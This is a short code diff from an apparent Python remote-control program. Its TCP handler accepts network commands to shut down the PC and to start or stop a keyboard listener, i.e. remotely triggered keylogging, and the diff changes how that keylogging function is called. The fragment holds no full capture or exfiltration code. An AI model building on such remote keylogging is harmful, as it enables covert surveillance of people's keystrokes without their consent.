@@ -42,11 +42,9 @@ def connectclient(tcpServer):
         if data == "shutdown":
             serverfunc.shutdown_pc()
         if data == "key_log_listening":
-            serverfunc.listening_keyboard(True)
-            pass
+            listening_keyboard(True)
         if data == "key_log_stop_listening":
-            serverfunc.listening_keyboard(False)
-            pass
+            listening_keyboard(False)
 
 
 def on_press(key):
